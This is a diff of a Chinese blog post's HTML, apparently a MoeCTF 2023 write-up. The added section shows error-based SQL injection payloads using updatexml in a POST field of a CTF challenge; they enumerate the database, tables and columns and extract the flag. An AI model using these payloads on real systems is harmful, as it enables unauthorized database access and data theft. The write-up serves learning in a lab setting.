@@ -146,7 +146,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="20">
-<input type="hidden" id="yelog_site_word_count" value="47k">
+<input type="hidden" id="yelog_site_word_count" value="47.3k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -473,12 +473,12 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-10-10 22:11:25'>2023-10-04 16:54</time>
+            发布时间 : <time class="date" title='最后更新: 2023-10-10 22:13:47'>2023-10-04 16:54</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:2.1k</span>
+        <span>字数:2.3k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -841,6 +841,25 @@ assert users[&quot;admin&quot;] == &quot;admin&quot;
 <img src="/2023/10/04/Moectf-2023/212200.png" class="">
 
 <p>可以直接sqlmap跑</p>
+<p>测试了一下<code>insert into table_name (列1, 列2,...) VALUES (值1, 值2,....)</code> 这个语句要拼接代码好像只能在VALUES中的最后一个参数位置进行拼接</p>
+<p>爆数据库名：</p>
+<pre><code>ip=34&amp;user_agent=fd&amp;time=123 and updatexml(1,concat(0x7e,(select database())),0x7e)
+//wordpress
+</code></pre>
+<p>爆表名：</p>
+<pre><code>ip=34&amp;user_agent=fd&amp;time=123 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;wordpress&#39;)),0x7e)
+//secret_of_kokomi,visitor_record
+</code></pre>
+<p>爆列名：</p>
+<pre><code>ip=34&amp;user_agent=fd&amp;time=123 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#39;secret_of_kokomi&#39;)),0x7e)
+//content,id
+</code></pre>
+<p>爆数据（因为报错注入有字符长度限制，所以这里要用right进行切割）：</p>
+<pre><code>ip=34&amp;user_agent=fd&amp;time=123 and updatexml(1,concat(0x7e,right((select group_concat(content)from secret_of_kokomi),30)),0x7e)
+//ve2y_C0de_3nd_Poss1bIlIti3s!!&#125;
+ip=34&amp;user_agent=fd&amp;time=123 and updatexml(1,concat(0x7e,right((select group_concat(content)from secret_of_kokomi),50)),0x7e)
+//moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3
+</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
